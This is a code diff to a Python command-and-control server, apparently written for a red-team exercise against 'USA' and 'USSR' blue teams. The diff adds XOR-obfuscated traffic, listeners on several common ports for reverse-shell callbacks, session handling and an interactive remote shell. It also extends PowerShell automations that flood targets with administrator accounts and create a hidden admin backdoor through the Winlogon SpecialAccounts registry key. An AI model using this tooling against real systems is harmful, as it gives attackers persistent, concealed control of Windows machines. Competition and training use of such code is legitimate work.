@@ -2,12 +2,42 @@ import socket
 import time
 import random
 import threading
-import argparse
 
-HOST = "0.0.0.0"
-PORT = 4444
+PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]
 
-# Pool of names per team
+# Shared XOR key — must match the key in the .ps1 payload exactly
+XOR_KEY = "CDTC0ldW4r$2026!xK"
+
+def xor_crypt(data: bytes, key: str) -> bytes:
+    """XOR encode or decode bytes against a repeating key."""
+    key_bytes = key.encode("utf-8")
+    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
+
+def send_command(conn, command):
+    try:
+        # Encode outgoing command before sending
+        encoded = xor_crypt(command.encode("utf-8"), XOR_KEY)
+        conn.send(encoded)
+        time.sleep(3)
+
+        # Receive and decode incoming response
+        response = b""
+        conn.settimeout(5)
+        try:
+            while True:
+                chunk = conn.recv(8192)
+                if not chunk:
+                    break
+                response += chunk
+        except socket.timeout:
+            pass
+
+        if response:
+            return xor_crypt(response, XOR_KEY).decode("utf-8", errors="ignore")
+        return ""
+    except Exception as e:
+        return f"[!] Send failed: {e}"
+
 NAME_POOLS = {
     "USA": [
         "james_brooks", "michael_reed", "david_lane", "robert_hayes",
@@ -25,22 +55,55 @@ NAME_POOLS = {
     ]
 }
 
-def send_command(conn, command):
-    conn.send((command + "\n").encode("utf-8"))
-    time.sleep(3)
-    response = b""
-    conn.settimeout(5)
-    try:
-        while True:
-            chunk = conn.recv(8192)
-            if not chunk:
-                break
-            response += chunk
-    except socket.timeout:
-        pass
-    return response.decode("utf-8", errors="ignore")
+sessions = {}
+sessions_lock = threading.Lock()
 
-# Powershell command to create a local user 
+def register_session(ip, conn, port):
+    with sessions_lock:
+        if ip in sessions:
+            try:
+                sessions[ip]["conn"].close()
+            except Exception:
+                pass
+        sessions[ip] = {"conn": conn, "port": port, "team": guess_team(ip)}
+        print(f"\n[+] New session: {ip} on port {port} (team: {guess_team(ip)})")
+        print("    Type 'sessions' at any prompt to see all active connections.")
+
+def guess_team(ip):
+    if ip.startswith("10.100.2."):
+        return "USA"
+    elif ip.startswith("10.100.3."):
+        return "USSR"
+    return "USA"  # your default for testing
+
+def remove_session(ip):
+    with sessions_lock:
+        if ip in sessions:
+            del sessions[ip]
+            print(f"[-] Session dropped: {ip}")
+
+def accept_loop(server, port):
+    while True:
+        try:
+            conn, addr = server.accept()
+            ip = addr[0]
+            register_session(ip, conn, port)
+        except Exception:
+            break
+
+def start_listeners():
+    for port in PORTS:
+        try:
+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server.bind(("0.0.0.0", port))
+            server.listen(10)
+            t = threading.Thread(target=accept_loop, args=(server, port), daemon=True)
+            t.start()
+            print(f"[*] Listener started on port {port}")
+        except Exception as e:
+            print(f"[!] Could not bind port {port}: {e}")
+
 def make_user_command(username, admin=False):
     password = "Welcome1!"
     cmd = (
@@ -52,89 +115,72 @@ def make_user_command(username, admin=False):
         cmd += f'; Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
     return cmd
 
-# Gets a random copy of the name pool for the specified team - reshuffles when exhausted!!!
 def get_name_queue(team):
-    pool = NAME_POOLS[team][:]
+    pool = NAME_POOLS.get(team, NAME_POOLS["USA"])[:]
     random.shuffle(pool)
     return pool
 
-#Drop users onto the box. count = how many to create, delay = seconds between each (0 = instant flood)
 def flood_users(conn, team, count, delay=0):
     queue = get_name_queue(team)
     used = []
     created = 0
-
     print(f"\n[*] Starting user drop — {count} users, {delay}s delay each\n")
-
     while created < count:
         if not queue:
-            print("[*] Name queue exhausted, reshuffling...")
+            print("[*] Queue exhausted, reshuffling...")
             queue = [n for n in get_name_queue(team) if n not in used[-10:]]
-
         username = queue.pop(0)
         used.append(username)
-
         cmd = make_user_command(username, admin=True)
-        print(f"[+] Creating user ({created + 1}/{count}): {username}")
+        print(f"[+] Creating ({created + 1}/{count}): {username}")
         result = send_command(conn, cmd)
         if result.strip():
             print(result)
-
         created += 1
         if delay > 0 and created < count:
-            print(f"[*] Waiting {delay}s before next user...")
+            print(f"[*] Waiting {delay}s...")
             time.sleep(delay)
-
     print(f"\n[+] Done. {count} users created.")
 
-# Creates a user that does NOT appear in the Users directory by setting registry hide flag
 def create_hidden_user(conn):
     username = "svc_diag"
     password = "Diag$2024!"
-
-    # Create the user
     cmd_create = (
         f'New-LocalUser -Name "{username}" '
         f'-Password (ConvertTo-SecureString "{password}" -AsPlainText -Force) '
         f'-PasswordNeverExpires'
     )
-    # Add to admins
     cmd_admin = f'Add-LocalGroupMember -Group "Administrators" -Member "{username}"'
-
-    # Hide from Windows login screen and Settings panel via registry
-    cmd_hide = (
-        f'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" '
+    cmd_hide  = (
+        f'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT'
+        f'\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" '
         f'-Name "{username}" -Value 0 -PropertyType DWord -Force'
     )
-
     print(f"\n[*] Creating hidden user: {username}")
     print(send_command(conn, cmd_create))
     print(send_command(conn, cmd_admin))
     print(send_command(conn, cmd_hide))
-    print(f"[+] Hidden user '{username}' created with password: {password}")
-    print("[!] User will NOT appear in Settings > Other Users or login screen")
+    print(f"[+] Hidden user '{username}' created | password: {password}")
 
 def user_flood_menu(conn, team):
     while True:
         print(f"\n--- User Flood Menu [{team}] ---")
         print("  [1] Drop 10 users instantly")
-        print("  [2] Slow drip — 1 user every 5 min (up to 5 users)")
+        print("  [2] Slow drip — 1 user every 5 min (up to 5)")
         print("  [3] Create 1 hidden admin user")
         print("  [0] Back")
         choice = input("Select> ").strip()
-
         if choice == "0":
             break
         elif choice == "1":
             flood_users(conn, team, count=10, delay=0)
         elif choice == "2":
-            t = threading.Thread(
+            threading.Thread(
                 target=flood_users,
                 args=(conn, team, 5, 300),
                 daemon=True
-            )
-            t.start()
-            print("[*] Slow drip running in background. You can keep using the menu.")
+            ).start()
+            print("[*] Slow drip running in background.")
         elif choice == "3":
             create_hidden_user(conn)
 
@@ -144,16 +190,14 @@ def automation_menu(conn, team):
         "2": ("Check IIS status",  "Get-Service -Name W3SVC | Select-Object Status"),
         "3": ("Whoami + hostname", "whoami; hostname"),
         "4": ("List local admins", "Get-LocalGroupMember -Group Administrators"),
-        "5": ("User flood",        None),  # handled separately
+        "5": ("User flood",        None),
     }
-
     while True:
         print(f"\n--- Automation Menu [{team}] ---")
         for key, (label, _) in automations.items():
             print(f"  [{key}] {label}")
         print("  [0] Back")
         choice = input("Select> ").strip()
-
         if choice == "0":
             break
         elif choice == "5":
@@ -163,49 +207,74 @@ def automation_menu(conn, team):
             print(f"\n[*] Running: {label}")
             print(send_command(conn, cmd))
 
-def interactive_mode(conn):
-    print("[*] Interactive mode. Type 'back' to return to menu.\n")
+def interactive_mode(conn, ip):
+    print(f"[*] Interactive shell on {ip}. Type 'back' to return.\n")
     while True:
-        cmd = input("shell> ").strip()
+        cmd = input(f"{ip}> ").strip()
         if cmd.lower() == "back":
             break
         if cmd:
             print(send_command(conn, cmd))
 
-def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "--team",
-        choices=["USA", "USSR"],
-        required=True,
-        help="Which blue team this terminal is targeting"
-    )
-    args = parser.parse_args()
-    team = args.team
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((HOST, PORT))
-    server.listen(1)
-    print(f"[*] Listening on port {PORT} | Targeting: {team}")
-
-    conn, addr = server.accept()
-    print(f"[+] Connection from {addr[0]}")
-
+def session_menu(ip):
+    with sessions_lock:
+        if ip not in sessions:
+            print(f"[!] No active session for {ip}")
+            return
+        session = sessions[ip]
+    conn  = session["conn"]
+    team  = session["team"]
+    port  = session["port"]
     while True:
-        print(f"\n=== C2 Menu [{team}] ===")
+        print(f"\n=== Session: {ip} | Team: {team} | Port: {port} ===")
         print("  [1] Interactive shell")
         print("  [2] Automations")
-        print("  [3] Exit")
+        print("  [3] Back to session list")
         choice = input("Select> ").strip()
-
         if choice == "1":
-            interactive_mode(conn)
+            interactive_mode(conn, ip)
         elif choice == "2":
             automation_menu(conn, team)
         elif choice == "3":
-            conn.close()
             break
+
+def print_sessions():
+    with sessions_lock:
+        if not sessions:
+            print("\n[!] No active sessions.")
+            return
+        print("\n--- Active Sessions ---")
+        for i, (ip, data) in enumerate(sessions.items(), 1):
+            print(f"  [{i}] {ip:15s}  port: {data['port']}  team: {data['team']}")
+
+def sessions_menu():
+    while True:
+        print("\n======== C2 SESSIONS ========")
+        print_sessions()
+        print("\n  [i]  Interact with a session (enter IP)")
+        print("  [r]  Refresh session list")
+        print("  [q]  Quit")
+        choice = input("\nC2> ").strip().lower()
+        if choice == "q":
+            print("[*] Exiting.")
+            break
+        elif choice == "r":
+            continue
+        elif choice == "i":
+            ip = input("Enter target IP> ").strip()
+            with sessions_lock:
+                if ip not in sessions:
+                    print(f"[!] No session for {ip}. Check IP or wait for callback.")
+                    continue
+            session_menu(ip)
+
+def main():
+    print("[*] Starting listeners...")
+    start_listeners()
+    print(f"[*] Listening on ports: {PORTS}")
+    print("[*] XOR encryption active — key loaded")
+    print("[*] Waiting for callbacks...\n")
+    sessions_menu()
 
 if __name__ == "__main__":
     main()
